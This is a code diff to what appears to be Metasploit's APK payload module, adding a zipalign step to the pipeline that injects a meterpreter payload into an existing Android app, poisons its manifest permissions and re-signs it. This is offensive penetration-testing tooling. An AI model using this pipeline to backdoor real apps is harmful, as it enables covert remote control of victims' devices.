@@ -131,6 +131,11 @@ module Msf::Payload::Apk
       raise RuntimeError, "jarsigner not found. If it's not in your PATH, please add it."
     end
 
+    zipalign = run_cmd("zipalign")
+    unless zipalign != nil
+      raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
+    end
+
     apktool = run_cmd("apktool -version")
     unless apktool != nil
       raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
@@ -199,6 +204,7 @@ module Msf::Payload::Apk
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
     injected_apk = "#{tempdir}/output.apk"
+    unaligned_apk = "#{tempdir}/unaligned.apk"
     print_status "Poisoning the manifest with meterpreter permissions..\n"
     fix_manifest(tempdir)
 
@@ -206,6 +212,9 @@ module Msf::Payload::Apk
     run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
     print_status "Signing #{injected_apk}\n"
     run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey")
+    print_status "Aligning #{injected_apk}\n"
+    FileUtils.mv("#{injected_apk}", "#{unaligned_apk}")
+    run_cmd("zipalign 4 #{unaligned_apk} #{injected_apk}")
 
     outputapk = File.read(injected_apk)
 
